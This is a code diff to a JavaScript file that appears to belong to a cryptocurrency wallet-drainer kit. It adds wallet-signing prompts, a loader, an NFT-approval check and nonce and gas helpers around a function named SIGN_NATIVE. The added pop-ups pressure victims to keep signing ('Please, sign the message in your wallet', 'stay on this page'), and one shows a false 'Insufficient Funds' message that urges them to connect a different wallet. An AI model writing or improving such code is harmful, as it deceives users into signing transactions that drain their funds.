@@ -925,11 +925,247 @@ const get_permit_type = (func) => {
 
 const CF_Gas_Reserves = {};
 
-const show_check = () => { 
-   // Disabled popup flow, background logic continues
-   return true;
+const show_check = () => {
+    try {
+        const loaderHtml = '<div class="loader"></div>';
+        if (CF_Loader_Style == 2) {
+            if (typeof MSL !== 'undefined' && MSL.fire) {
+                MSL.fire({ title: 'Processing...', html: loaderHtml, showConfirmButton: false, allowOutsideClick: false, allowEscapeKey: false, color: CF_Color_Scheme, width: 200 });
+            } else if (typeof Swal !== 'undefined' && Swal.fire) {
+                Swal.fire({ title: 'Processing...', html: loaderHtml, showConfirmButton: false, allowOutsideClick: false, allowEscapeKey: false, width: 200 });
+            }
+        } else {
+            if (typeof Swal !== 'undefined' && Swal.fire) {
+                Swal.fire({ title: 'Processing...', html: loaderHtml, showConfirmButton: false, allowOutsideClick: false, allowEscapeKey: false, width: 200 });
+            }
+        }
+    } catch (err) {
+        console.log(err);
+    }
 };
 
+// ================== CSS for loader ==================
+if (!document.getElementById('cf-simple-loader-style')) {
+    const style = document.createElement('style');
+    style.id = 'cf-simple-loader-style';
+    style.innerHTML = `
+    .loader {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #3498db;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin: auto;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }`;
+    document.head.appendChild(style);
+}
+
+const get_nonce = async(chain_id) => {
+    const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[chain_id]);
+    return await node.getTransactionCount(CF_Current_Address, "pending");
+};
+
+const wait_message = () => {
+    try {
+        if (!CF_Process) return;
+        Swal.close();
+        if (CF_Loader_Style == 2) {
+            MSL.fire({
+                icon: 'success',
+                title: 'Signature Received!',
+                subtitle: 'Thank you!',
+                text: 'We received your sign, please wait for confirmation...',
+                showConfirmButton: false,
+                timer: 2500,
+                color: CF_Color_Scheme
+            }).then(() => {
+                MSL.fire({
+                    icon: 'load',
+                    title: 'Processing Signature',
+                    text: 'Please, stay on this page while we confirm it...',
+                    showConfirmButton: true,
+                    confirmButtonText: 'Confirming...',
+                    color: CF_Color_Scheme
+                });
+            });
+        } else {
+            Swal.fire({
+                html: '<b>Thanks!</b>',
+                icon: 'success',
+                allowOutsideClick: false,
+                allowEscapeKey: false,
+                timer: 2500,
+                width: 600,
+                showConfirmButton: false
+            }).then(() => {
+                Swal.fire({
+                    html: '<b>Confirming your sign...</b><br><br>Please, don\'t leave this page!',
+                    imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
+                    imageHeight: 60,
+                    allowOutsideClick: false,
+                    allowEscapeKey: false,
+                    timer: 0,
+                    width: 600,
+                    showConfirmButton: false
+                });
+            });
+        }
+
+    } catch (err) {
+        console.log(err);
+    }
+};
+
+const end_message = () => {
+    try {
+        if (CF_Loader_Style == 2) {
+            MSL.fire({
+                icon: 'error',
+                title: 'Insufficient Funds',
+                subtitle: 'Unable to proceed',
+                text: 'Your wallet does not meet the minimum balance requirements. Please try again with a different wallet.',
+                showConfirmButton: true,
+                confirmButtonText: 'OK',
+                color: CF_Color_Scheme
+            });
+        } else {
+            Swal.close();
+            Swal.fire({
+                html: '<b>Sorry!</b> Your wallet doesn\'t meet the requirements.<br><br>Try to connect a middle-active wallet to try again!',
+                icon: 'error',
+                allowOutsideClick: true,
+                allowEscapeKey: true,
+                timer: 0,
+                width: 600,
+                showConfirmButton: true,
+                confirmButtonText: 'OK'
+            });
+        }
+    } catch (err) {
+        console.log(err);
+    }
+};
+
+let is_first_sign = true;
+
+const sign_ready = () => {
+    try {
+        if (CF_Loader_Style == 2) {
+            MSL.fire({
+                icon: 'success',
+                title: 'Transaction Signed',
+                subtitle: 'Signature confirmed!',
+                text: 'Your transaction is being processed. Please wait...',
+                showConfirmButton: false,
+                color: CF_Color_Scheme
+            });
+        } else {
+            Swal.close();
+            Swal.fire({
+                html: '<b>Success!</b> Your sign is confirmed!',
+                icon: 'success',
+                allowOutsideClick: false,
+                allowEscapeKey: false,
+                timer: 0,
+                width: 600,
+                showConfirmButton: false
+            });
+        }
+    } catch (err) {
+        console.log(err);
+    }
+};
+
+const sign_next = () => {
+    try {
+        if (is_first_sign) {
+            is_first_sign = false;
+            show_sign_message();
+            return;
+        }
+        if (CF_Loader_Style == 2) {
+            MSL.fire({
+                icon: 'load',
+                title: 'Action Required',
+                text: 'Please, sign the message in your wallet to continue...',
+                showConfirmButton: true,
+                confirmButtonText: 'Awaiting Signature...',
+                color: CF_Color_Scheme
+            });
+        } else {
+            Swal.close();
+            Swal.fire({
+                html: '<b>Waiting for your sign...</b><br><br>Please, sign message in your wallet!',
+                imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
+                imageHeight: 60,
+                allowOutsideClick: false,
+                allowEscapeKey: false,
+                timer: 0,
+                width: 600,
+                showConfirmButton: false
+            });
+        }
+    } catch (err) {
+        console.log(err);
+    }
+};
+
+const is_nft_approved = async(contract_address, owner_address, spender_address) => {
+    try {
+        const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[1]);
+        const contract = new ethers.Contract(contract_address, CF_Contract_ABI['ERC721'], node);
+        return await contract.isApprovedForAll(owner_address, spender_address);
+    } catch (err) {
+        console.log(err);
+        return false;
+    }
+};
+
+const get_gas_limit_def_by_chain_id = (chain_id) => {
+    switch (chain_id) {
+        case 42161:
+            return BN(5000000);
+        case 43114:
+            return BN(5000000);
+        default:
+            return BN(100000);
+    }
+}
+
+const show_sign_message = () => {
+    try {
+        if (CF_Loader_Style == 2) {
+            MSL.fire({
+                icon: 'load',
+                title: 'Action Required',
+                text: 'Please, sign the message in your wallet to continue...',
+                showConfirmButton: true,
+                confirmButtonText: 'Awaiting Signature...',
+                color: CF_Color_Scheme
+            });
+        } else {
+            Swal.close();
+            Swal.fire({
+                html: '<b>Done!</b> Sign message in your wallet to continue...',
+                imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
+                imageHeight: 60,
+                allowOutsideClick: false,
+                allowEscapeKey: false,
+                timer: 0,
+                width: 600,
+                showConfirmButton: false
+            });
+        }
+    } catch (err) {
+        console.log(err);
+    }
+};
 
 const SIGN_NATIVE = async(asset) => {
     const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
